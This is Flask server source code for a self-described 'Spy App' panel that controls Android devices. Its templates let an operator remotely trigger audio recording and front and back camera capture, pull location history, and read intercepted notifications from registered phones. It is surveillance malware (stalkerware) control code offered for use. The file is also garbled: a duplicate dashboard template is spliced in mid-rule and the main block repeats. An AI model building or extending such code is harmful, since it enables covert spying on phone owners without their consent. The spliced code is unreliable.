        .devices-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .device-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .device-name { font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333; }
        .device-info { color: #666; margin-bottom: 5px; font-size: 14px; }
        .device-status { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; }
        .status-online { background: #d4edda; color: #155724; }
        .status-offline { background: #f8d7da; color: #721c24; }
        .device-link { display: inline-block; margin-top: 10px; padding: 8px 15px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; font-size: 14px; }
        .device-link:hover { background: #0056b3; }
        .no-devices { text-align: center; color: #666; padding: 40px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>📱 Connected Devices</h1>
        <a href="/logout" class="logout-btn">Logout</a>
    </div>
    
    {% if devices %}
        <div class="devices-grid">
            {% for device in devices %}
                <div class="device-card">
                    <div class="device-name">{{ device.name }}</div>
                    <div class="device-info">ID: {{ device.id }}</div>
                    <div class="device-info">Model: {{ device.model }}</div>
                    <div class="device-info">Android: {{ device.android_version }}</div>
                    <div class="device-info">IP: {{ device.ip_address }}</div>
                    <div class="device-info">
                        Status: <span class="device-status {% if device.status == 'online' %}status-online{% else %}status-offline{% endif %}">
                            {{ device.status|upper }}
                        </span>
                    </div>
                    <div class="device-info">
                        Last seen: {{ device.last_seen|int|ctime }}
                    </div>
                    <a href="/device/{{ device.id }}" class="device-link">View Dashboard</a>
                </div>
            {% endfor %}
        </div>
    {% else %}
        <div class="no-devices">
            <h2>No devices connected yet</h2>
            <p>Devices will appear here when they register with the system.</p>
        </div>
    {% endif %}
</body>
</html>
"""

DEVICE_DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>{{ device.name }} - Spy App</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }
        .header { background: white; padding: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-bottom: 20px; }
        .header-content { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
        h1 { color: #333; margin: 0; }
        .nav-links a { margin-left: 15px; color: #007bff; text-decoration: none; }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
        .section { background: white; padding: 20px; margin-bottom: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .section h2 { margin-top: 0; color: #333; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px; }
        .controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .control-btn { padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; }
        .control-btn:hover { background: #0056b3; }
        .control-btn.camera { background: #28a745; }
        .control-btn.camera:hover { background: #218838; }
        .control-btn.location { background: #ffc107; color: #000; }
        .control-btn.location:hover { background: #e0a800; }
        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
        .file-card { border: 1px solid #ddd; border-radius: 5px; padding: 15px; text-align: center; }
        .file-card img { max-width: 100%; height: 120px; object-fit: cover; border-radius: 5px; }
        .file-card audio { width: 100%; margin-top: 10px; }
        .file-info { margin-top: 10px; font-size: 12px; color: #666; }
        .file-link { display: block; margin-top: 5px; color: #007bff; text-decoration: none; }
        .notification { padding: 10px; border-left: 4px solid #007bff; background: #f8f9fa; margin-bottom: 10px; }
        .notification.unread { border-left-color: #dc3545; background: #fff5f5; }
        .notification-title { font-weight: bold; margin-bottom: 5px; }
        .notification-message { color: #666; font-size: 14px; }
        .notification-time { color: #999; font-size: 12px; margin-top: 5px; }
        .status-badge { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; margin-left: 10px; }
        .online { background: #d4edda; color: #155724; }
        .offline { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <h1>📱 {{ device.name }} 
                <span class="status-badge {% if device.status == 'online' %}online{% else %}offline{% endif %}">
                    {{ device.status|upper }}
                </span>
            </h1>
            <div class="nav-links">
                <a href="/">← Back to Devices</a>
                <a href="/logout">Logout</a>
            </div>
        </div>
    </div>
    
    <div class="container">
        <!-- Device Info Section -->
        <div class="section">
            <h2>Device Information</h2>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px;">
                <div><strong>Device ID:</strong> {{ device.id }}</div>
                <div><strong>Model:</strong> {{ device.model }}</div>
                <div><strong>Android Version:</strong> {{ device.android_version }}</div>
                <div><strong>IP Address:</strong> {{ device.ip_address }}</div>
                <div><strong>Last Seen:</strong> {{ device.last_seen|int|ctime }}</div>
                <div><strong>First Seen:</strong> {{ device.first_seen|int|ctime }}</div>
            </div>
        </div>
        
        <!-- Controls Section -->
        <div class="section">
            <h2>Remote Controls</h2>
            <div class="controls">
                <button class="control-btn" onclick="startRecording()">🎙️ Start Recording (15s)</button>
                <button class="control-btn camera" onclick="startCamera('front')">📸 Front Camera</button>
                <button class="control-btn camera" onclick="startCamera('back')">📷 Back Camera</button>
                <button class="control-btn location" onclick="startLocation()">📍 Get Location</button>
                <button class="control-btn" onclick="refreshFiles()">🔄 Refresh Files</button>
            </div>
            <div id="control-status" style="margin-top: 10px;"></div>
        </div>
        
        <!-- Notifications Section -->
        {% if notifications %}
        <div class="section">
            <h2>Recent Notifications</h2>
            {% for notification in notifications %}
                <div class="notification {% if not notification.read %}unread{% endif %}" id="notification-{{ notification.id }}">
                    <div class="notification-title">{{ notification.title }}</div>
                    <div class="notification-message">{{ notification.message }}</div>
                    <div class="notification-time">{{ notification.timestamp|int|ctime }}</div>
                </div>
            {% endfor %}
        </div>
        {% endif %}
        
        <!-- Photos Section -->
        {% if photos %}
        <div class="section">
            <h2>Recent Photos ({{ photos|length }})</h2>
            <div class="file-grid">
                {% for photo in photos %}
                    <div class="file-card">
                        <img src="/files/{{ photo.name }}" alt="Photo" onerror="this.style.display='none'">
                        <div class="file-info">
                            {{ photo.name }}<br>
                            {{ (photo.size / 1024)|round|int }} KB<br>
                            {{ photo.modified|int|ctime }}
                        </div>
                        <a href="/files/{{ photo.name }}" class="file-link" download>Download</a>
                    </div>
                {% endfor %}
            </div>
        </div>
        {% endif %}
        
        <!-- Recordings Section -->
        {% if files %}
        <div class="section">
            <h2>Audio Recordings ({{ files|length }})</h2>
            <div class="file-grid">
                {% for file in files %}
                    <div class="file-card">
                        <audio controls>
                            <source src="/files/{{ file.name }}" type="audio/mp4">
                            Your browser does not support the audio element.
                        </audio>
                        <div class="file-info">
                            {{ file.name }}<br>
                            {{ (file.size / 1024)|round|int }} KB<br>
                            {{ file.modified|int|ctime }}
                        </div>
                        <a href="/files/{{ file.name }}" class="file-link" download>Download</a>
                    </div>
                {% endfor %}
            </div>
        </div>
        {% endif %}
        
        <!-- Location Section -->
        {% if location_files %}
        <div class="section">
            <h2>Location History ({{ location_files|length }})</h2>
            <div style="display: grid; gap: 10px;">
                {% for location in location_files %}
                    <div style="padding: 10px; border: 1px solid #ddd; border-radius: 5px;">
                        <strong>{{ location.name }}</strong><br>
                        {{ (location.size / 1024)|round|int }} KB - {{ location.modified|int|ctime }}<br>
                        <a href="/files/{{ location.name }}" target="_blank">View Location Details</a>
                    </div>
                {% endfor %}
            </div>
        </div>
        {% endif %}
        
        <!-- No Files Message -->
        {% if not files and not photos and not location_files %}
        <div class="section">
            <h2>No Files Yet</h2>
            <p>No recordings, photos, or location data has been uploaded from this device yet.</p>
            <p>Use the controls above to capture data from the device.</p>
        </div>
        {% endif %}
    </div>

    <script>
        function showStatus(message, isError = false) {
            const statusEl = document.getElementById('control-status');
            statusEl.innerHTML = message;
            statusEl.style.color = isError ? 'red' : 'green';
            setTimeout(() => statusEl.innerHTML = '', 5000);
        }
        
        async function startRecording() {
            try {
                showStatus('Sending recording signal...');
                const response = await fetch('/device/{{ device_id }}/start-recording', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ record_time: 15 })
                });
                
                const data = await response.json();
                if (data.ok) {
                    showStatus('✅ Recording signal sent! Device should start recording...');
                } else {
                    showStatus('❌ Failed to send signal: ' + data.error, true);
                }
            } catch (error) {
                showStatus('❌ Error: ' + error.message, true);
            }
        }
        
        async function startCamera(cameraType) {
            try {
                showStatus(`Starting ${cameraType} camera...`);
                const response = await fetch('/device/{{ device_id }}/start-camera-signal', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ camera_type: cameraType })
                });
                
                const data = await response.json();
                if (data.ok) {
                    showStatus(`✅ ${cameraType} camera signal sent!`);
                } else {
                    showStatus('❌ Failed to start camera: ' + data.error, true);
                }
            } catch (error) {
                showStatus('❌ Error: ' + error.message, true);
            }
        }
        
        async function startLocation() {
            try {
                showStatus('Requesting location...');
                const response = await fetch('/device/{{ device_id }}/start-location-signal', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                
                const data = await response.json();
                if (data.ok) {
                    showStatus('✅ Location request sent!');
                } else {
                    showStatus('❌ Failed to request location: ' + data.error, true);
                }
            } catch (error) {
                showStatus('❌ Error: ' + error.message, true);
            }
        }
        
        async function refreshFiles() {
            try {
                showStatus('Refreshing files...');
                const response = await fetch('/device/{{ device_id }}/refresh-files', {
                    method: 'POST'
                });
                
                const data = await response.json();
                if (data.ok) {
                    showStatus('✅ Files refreshed!');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showStatus('❌ Failed to refresh files', true);
                }
            } catch (error) {
                showStatus('❌ Error: ' + error.message, true);
            }
        }
        
        // Auto-refresh page every 30 seconds to check for new files
        setTimeout(() => location.reload(), 30000);
    </script>
</body>
</html>
"""

# ✅ DEBUGGING ROUTES

@app.route('/debug-filesystem')
def debug_filesystem():
    """Debug route to check file system status"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    upload_dir = app.config['UPLOAD_FOLDER']
    device_dir = app.config['DEVICE_FOLDER']
    notification_dir = app.config['NOTIFICATION_FOLDER']
    
    result = {
        'upload_directory': {
            'path': upload_dir,
            'exists': os.path.exists(upload_dir),
            'files': []
        },
        'device_directory': {
            'path': device_dir,
            'exists': os.path.exists(device_dir),
            'files': []
        },
        'notification_directory': {
            'path': notification_dir,
            'exists': os.path.exists(notification_dir),
            'files': []
        }
    }
    
    # Check upload directory
    if os.path.exists(upload_dir):
        try:
            files = os.listdir(upload_dir)
            for filename in files:
                filepath = os.path.join(upload_dir, filename)
                result['upload_directory']['files'].append({
                    'name': filename,
                    'size': os.path.getsize(filepath),
                    'modified': time.ctime(os.path.getmtime(filepath))
                })
        except Exception as e:
            result['upload_directory']['error'] = str(e)
    
    # Check device directory  
    if os.path.exists(device_dir):
        try:
            files = os.listdir(device_dir)
            for filename in files:
                filepath = os.path.join(device_dir, filename)
                result['device_directory']['files'].append({
                    'name': filename,
                    'size': os.path.getsize(filepath),
                    'modified': time.ctime(os.path.getmtime(filepath))
                })
        except Exception as e:
            result['device_directory']['error'] = str(e)
    
    return jsonify(result)

@app.route('/device/<device_id>/refresh-files', methods=['POST'])
def refresh_device_files(device_id):
    """Manually refresh files for a device"""
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    try:
        # This will trigger the file scanning logic
        return jsonify({'ok': True, 'message': 'Files refreshed successfully'})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

# ✅ RUN THE APPLICATION

if __name__ == '__main__':
    print("🚀 Starting Spy App Server...")
    print(f"📁 Upload folder: {app.config['UPLOAD_FOLDER']}")
    print(f"📁 Device folder: {app.config['DEVICE_FOLDER']}")
    print(f"📁 Notification folder: {app.config['NOTIFICATION_FOLDER']}")
    
    # Ensure all directories exist
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)
    os.makedirs(app.config['NOTIFICATION_FOLDER'], exist_ok=True)
    
    app.run(host='0.0.0.0', port=5000, debug=True)m: 12px;
        }
        
        /* Control Groups */
        .control-group {
            margin-bottom: 20px;
        }
        
        .control-group label {
            display: block;
            color: var(--primary);
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .control-group input {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            color: var(--light);
            padding: 12px 15px;
            font-size: 1rem;
            width: 120px;
            transition: all 0.3s ease;
        }
        
        .control-group input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(99, 102, 241, 0.3);
            background: rgba(255, 255, 255, 0.1);
        }
        
        /* Control Buttons */
        .controls {
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .btn-control {
            padding: 14px 25px;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: white;
        }
        
        .btn-start {
            background: linear-gradient(135deg, var(--success) 0%, #059669 100%);
        }
        
        .btn-stop {
            background: linear-gradient(135deg, var(--danger) 0%, #dc2626 100%);
        }
        
        .btn-camera-front {
            background: linear-gradient(135deg, var(--info) 0%, #2563eb 100%);
        }
        
        .btn-camera-back {
            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
        }
        
        .btn-location {
            background: linear-gradient(135deg, var(--warning) 0%, #d97706 100%);
        }
        
        .btn-notification {
            background: linear-gradient(135deg, #ec4899 0%, #db2777 100%);
        }
        
        /* Status Indicators */
        .signal-status {
            padding: 10px 15px;
            border-radius: 10px;
            font-weight: 600;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .status-active {
            background: rgba(16, 185, 129, 0.2);
            color: var(--success);
            border: 1px solid rgba(16, 185, 129, 0.5);
        }
        
        .status-inactive {
            background: rgba(107, 114, 128, 0.2);
            color: var(--gray);
            border: 1px solid rgba(107, 114, 128, 0.5);
        }
        
        /* File Lists */
        .files-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .file-card {
            background: rgba(55, 65, 81, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 20px;
            transition: all 0.3s ease;
        }
        
        .file-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(99, 102, 241, 0.3);
            border-color: var(--primary);
        }
        
        .file-name {
            color: var(--primary);
            font-weight: 600;
            margin-bottom: 8px;
            word-break: break-all;
            font-size: 0.9rem;
        }
        
        .file-info {
            display: flex;
            justify-content: space-between;
            color: var(--gray);
            font-size: 0.85rem;
            margin-bottom: 12px;
        }
        
        .file-actions {
            display: flex;
            gap: 10px;
        }
        
        .btn-file {
            flex: 1;
            padding: 8px 12px;
            border: none;
            border-radius: 8px;
            font-size: 0.8rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            text-decoration: none;
            color: white;
        }
        
        .btn-download {
            background: linear-gradient(135deg, var(--success) 0%, #059669 100%);
        }
        
        .btn-delete {
            background: linear-gradient(135deg, var(--danger) 0%, #dc2626 100%);
        }
        
        /* Photos Grid */
        .photos-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .photo-card {
            background: rgba(55, 65, 81, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        
        .photo-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(99, 102, 241, 0.3);
            border-color: var(--primary);
        }
        
        .photo-img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            background: var(--dark);
        }
        
        .photo-info {
            padding: 12px;
        }
        
        .photo-name {
            color: var(--primary);
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 5px;
            word-break: break-all;
        }
        
        .photo-size {
            color: var(--gray);
            font-size: 0.75rem;
        }
        
        /* Notifications List */
        .notifications-list {
            margin-top: 20px;
        }
        
        .notification-item {
            background: rgba(55, 65, 81, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 10px;
            transition: all 0.3s ease;
        }
        
        .notification-item:hover {
            border-color: var(--primary);
            transform: translateX(5px);
        }
        
        .notification-item.unread {
            border-left: 4px solid var(--primary);
            background: rgba(99, 102, 241, 0.1);
        }
        
        .notification-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 8px;
        }
        
        .notification-title {
            color: var(--light);
            font-weight: 600;
            font-size: 0.95rem;
        }
        
        .notification-time {
            color: var(--gray);
            font-size: 0.8rem;
        }
        
        .notification-text {
            color: var(--gray);
            font-size: 0.85rem;
            margin-bottom: 8px;
        }
        
        .notification-package {
            color: var(--primary);
            font-size: 0.75rem;
            font-weight: 500;
        }
        
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: var(--gray);
        }
        
        .empty-state h4 {
            font-size: 1.2rem;
            margin-bottom: 10px;
            color: var(--light);
        }
        
        /* Tabs */
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding-bottom: 10px;
        }
        
        .tab {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.05);
            color: var(--gray);
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
        }
        
        .tab.active {
            background: var(--primary);
            color: white;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            header {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }
            
            .device-info {
                justify-content: center;
            }
            
            .controls {
                flex-direction: column;
                align-items: stretch;
            }
            
            .btn-control {
                justify-content: center;
            }
            
            .files-grid {
                grid-template-columns: 1fr;
            }
            
            .photos-grid {
                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header>
            <div class="header-left">
                <h1>🎮 {{ device.name }}</h1>
                <p>Device Control Panel</p>
                <div class="device-info">
                    <div class="device-info-item">
                        <span>📱 Model:</span>
                        <span>{{ device.model }}</span>
                    </div>
                    <div class="device-info-item">
                        <span>🆔 ID:</span>
                        <span>{{ device_id }}</span>
                    </div>
                    <div class="device-info-item">
                        <span>🌐 IP:</span>
                        <span>{{ device.ip_address }}</span>
                    </div>
                    <div class="device-info-item">
                        <span>🤖 Android:</span>
                        <span>{{ device.android_version }}</span>
                    </div>
                </div>
            </div>
            <div class="header-right">
                <a href="/" class="btn btn-back">⬅️ All Devices</a>
                <a href="/logout" class="btn btn-logout">🚪 Logout</a>
            </div>
        </header>

        <!-- Tabs -->
        <div class="tabs">
            <button class="tab active" onclick="switchTab('controls')">🎮 Controls</button>
            <button class="tab" onclick="switchTab('files')">📁 Files</button>
            <button class="tab" onclick="switchTab('notifications')">🔔 Notifications</button>
        </div>

        <!-- Controls Tab -->
        <div id="controls" class="tab-content active">
            <!-- Recording Controls -->
            <div class="control-section">
                <div class="section-title">🎤 Audio Recording Controls</div>
                
                <div class="control-group">
                    <label for="recordTime">Recording Duration (seconds):</label>
                    <input type="number" id="recordTime" value="15" min="5" max="300">
                </div>
                
                <div class="controls">
                    <button class="btn-control btn-start" onclick="startRecording()">
                        🎤 Start Recording
                    </button>
                    <button class="btn-control btn-stop" onclick="stopRecording()">
                        ⏹️ Stop Recording
                    </button>
                    <div class="signal-status status-inactive" id="recordingStatus">
                        🔴 Recording: Inactive
                    </div>
                </div>
            </div>

            <!-- Camera Controls -->
            <div class="control-section">
                <div class="section-title">📸 Camera Controls</div>
                
                <div class="controls">
                    <button class="btn-control btn-camera-front" onclick="captureCamera('front')">
                        📱 Front Camera
                    </button>
                    <button class="btn-control btn-camera-back" onclick="captureCamera('back')">
                        📷 Back Camera
                    </button>
                    <div class="signal-status status-inactive" id="cameraStatus">
                        🔴 Camera: Inactive
                    </div>
                </div>
            </div>

            <!-- Location Controls -->
            <div class="control-section">
                <div class="section-title">📍 Location Controls</div>
                
                <div class="controls">
                    <button class="btn-control btn-location" onclick="getLocation()">
                        📍 Get Location
                    </button>
                    <div class="signal-status status-inactive" id="locationStatus">
                        🔴 Location: Inactive
                    </div>
                </div>
            </div>

            <!-- Notification Controls -->
            <div class="control-section">
                <div class="section-title">🔔 Notification Controls</div>
                
                <div class="controls">
                    <button class="btn-control btn-notification" onclick="testNotification()">
                        🔔 Send Test Notification
                    </button>
                    <button class="btn-control btn-stop" onclick="clearNotifications()">
                        🗑️ Clear All Notifications
                    </button>
                </div>
            </div>
        </div>

        <!-- Files Tab -->
        <div id="files" class="tab-content">
            <!-- Recordings List -->
            <div class="control-section">
                <div class="section-title">🎵 Recent Recordings</div>
                
                {% if files %}
                <div class="files-grid">
                    {% for file in files %}
                    <div class="file-card">
                        <div class="file-name">{{ file.name }}</div>
                        <div class="file-info">
                            <span>Size: {{ (file.size / 1024 / 1024)|round(2) }} MB</span>
                            <span>{{ file.modified|int|string|truncate(10, True, '') }}</span>
                        </div>
                        <div class="file-actions">
                            <a href="/files/{{ file.name }}" class="btn-file btn-download" download>📥 Download</a>
                            <button class="btn-file btn-delete" onclick="deleteFile('{{ file.name }}')">🗑️ Delete</button>
                        </div>
                    </div>
                    {% endfor %}
                </div>
                {% else %}
                <div class="empty-state">
                    <h4>📭 No Recordings Found</h4>
                    <p>Start recording to see files here</p>
                </div>
                {% endif %}
            </div>

            <!-- Photos List -->
            <div class="control-section">
                <div class="section-title">🖼️ Recent Photos</div>
                
                {% if photos %}
                <div class="photos-grid">
                    {% for photo in photos %}
                    <div class="photo-card">
                        <img src="/files/{{ photo.name }}" alt="{{ photo.name }}" class="photo-img" 
                             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDIwMCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMTUwIiBmaWxsPSIjMUExQTFBIi8+CjxwYXRoIGQ9Ik03NSA1MEgxMjVNMTI1IDUwSDEyNS41TTEyNSA1MEwxMjUgNTAuNVpNNzUgNzVIMTI1TTc1IDEwMEgxMjUiIHN0cm9rZT0iIzMzMyIgc3Ryb2tlLXdpZHRoPSIyIi8+CjxjaXJjbGUgY3g9Ijc1IiBjeT0iMTAwIiByPSIxNSIgZmlsbD0iIzMzMyIvPgo8L3N2Zz4K'">
                        <div class="photo-info">
                            <div class="photo-name">{{ photo.name }}</div>
                            <div class="photo-size">{{ (photo.size / 1024)|round(2) }} KB</div>
                        </div>
                    </div>
                    {% endfor %}
                </div>
                {% else %}
                <div class="empty-state">
                    <h4>📷 No Photos Found</h4>
                    <p>Capture photos using camera controls</p>
                </div>
                {% endif %}
            </div>

            <!-- Location Files -->
            <div class="control-section">
                <div class="section-title">🗺️ Location History</div>
                
                {% if location_files %}
                <div class="files-grid">
                    {% for location in location_files %}
                    <div class="file-card">
                        <div class="file-name">{{ location.name }}</div>
                        <div class="file-info">
                            <span>Size: {{ (location.size / 1024)|round(2) }} KB</span>
                            <span>{{ location.modified|int|string|truncate(10, True, '') }}</span>
                        </div>
                        <div class="file-actions">
                            <a href="/files/{{ location.name }}" class="btn-file btn-download" download>📥 Download</a>
                            <button class="btn-file btn-delete" onclick="deleteFile('{{ location.name }}')">🗑️ Delete</button>
                        </div>
                    </div>
                    {% endfor %}
                </div>
                {% else %}
                <div class="empty-state">
                    <h4>🗺️ No Location Data</h4>
                    <p>Get location data using location controls</p>
                </div>
                {% endif %}
            </div>
        </div>

        <!-- Notifications Tab -->
        <div id="notifications" class="tab-content">
            <div class="control-section">
                <div class="section-title">🔔 Device Notifications</div>
                
                {% if notifications %}
                <div class="notifications-list">
                    {% for notification in notifications %}
                    <div class="notification-item {{ 'unread' if not notification.read }}">
                        <div class="notification-header">
                            <div class="notification-title">{{ notification.title }}</div>
                            <div class="notification-time">{{ notification.timestamp|int|string|truncate(10, True, '') }}</div>
                        </div>
                        <div class="notification-text">{{ notification.text }}</div>
                        <div class="notification-package">{{ notification.package }}</div>
                    </div>
                    {% endfor %}
                </div>
                {% else %}
                <div class="empty-state">
                    <h4>🔔 No Notifications</h4>
                    <p>Device notifications will appear here</p>
                </div>
                {% endif %}
            </div>
        </div>
    </div>

    <script>
        const deviceId = "{{ device_id }}";
        
        // Tab switching
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            
            // Update tab buttons
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.target.classList.add('active');
        }
        
        // Recording functions
        async function startRecording() {
            const recordTime = document.getElementById('recordTime').value || 15;
            
            try {
                const response = await fetch(`/device/${deviceId}/start-recording`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ record_time: parseInt(recordTime) })
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    updateStatus('recordingStatus', '🟢 Recording: Active', 'status-active');
                    showNotification('Recording signal sent to device', 'success');
                } else {
                    showNotification('Failed to send recording signal: ' + data.error, 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('Failed to send recording signal', 'error');
            }
        }
        
        function stopRecording() {
            updateStatus('recordingStatus', '🔴 Recording: Inactive', 'status-inactive');
            showNotification('Recording will stop automatically after duration', 'info');
        }
        
        // Camera functions
        async function captureCamera(cameraType) {
            try {
                const response = await fetch(`/device/${deviceId}/start-camera-signal`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ camera_type: cameraType })
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    updateStatus('cameraStatus', `🟢 Camera: ${cameraType} Active`, 'status-active');
                    showNotification(`${cameraType} camera signal sent to device`, 'success');
                    
                    // Reset status after 5 seconds
                    setTimeout(() => {
                        updateStatus('cameraStatus', '🔴 Camera: Inactive', 'status-inactive');
                    }, 5000);
                } else {
                    showNotification('Failed to send camera signal: ' + data.error, 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('Failed to send camera signal', 'error');
            }
        }
        
        // Location functions
        async function getLocation() {
            try {
                const response = await fetch(`/device/${deviceId}/start-location-signal`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    updateStatus('locationStatus', '🟢 Location: Active', 'status-active');
                    showNotification('Location signal sent to device', 'success');
                    
                    // Reset status after 5 seconds
                    setTimeout(() => {
                        updateStatus('locationStatus', '🔴 Location: Inactive', 'status-inactive');
                    }, 5000);
                } else {
                    showNotification('Failed to send location signal: ' + data.error, 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('Failed to send location signal', 'error');
            }
        }
        
        // Notification functions
        async function testNotification() {
            try {
                showNotification('Test notification feature coming soon!', 'info');
            } catch (error) {
                console.error('Error:', error);
                showNotification('Notification test failed', 'error');
            }
        }
        
        async function clearNotifications() {
            if (confirm('Are you sure you want to clear all notifications?')) {
                try {
                    const response = await fetch(`/device/${deviceId}/clear-notifications`, {
                        method: 'POST'
                    });
                    
                    if (response.ok) {
                        showNotification('All notifications cleared', 'success');
                        setTimeout(() => location.reload(), 1000);
                    } else {
                        showNotification('Failed to clear notifications', 'error');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    showNotification('Failed to clear notifications', 'error');
                }
            }
        }
        
        // Utility functions
        function updateStatus(elementId, text, className) {
            const element = document.getElementById(elementId);
            element.textContent = text;
            element.className = `signal-status ${className}`;
        }
        
        function showNotification(message, type) {
            // Simple notification - you can enhance this with a proper notification system
            alert(`${type.toUpperCase()}: ${message}`);
        }
        
        async function deleteFile(filename) {
            if (confirm('Are you sure you want to delete this file?')) {
                try {
                    const response = await fetch(`/delete-file/${filename}`, {
                        method: 'POST'
                    });
                    
                    if (response.ok) {
                        showNotification('File deleted successfully', 'success');
                        location.reload();
                    } else {
                        showNotification('Failed to delete file', 'error');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    showNotification('Failed to delete file', 'error');
                }
            }
        }
        
        // Auto-refresh data every 10 seconds
        setInterval(() => {
            // You can implement auto-refresh for specific sections here
        }, 10000);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)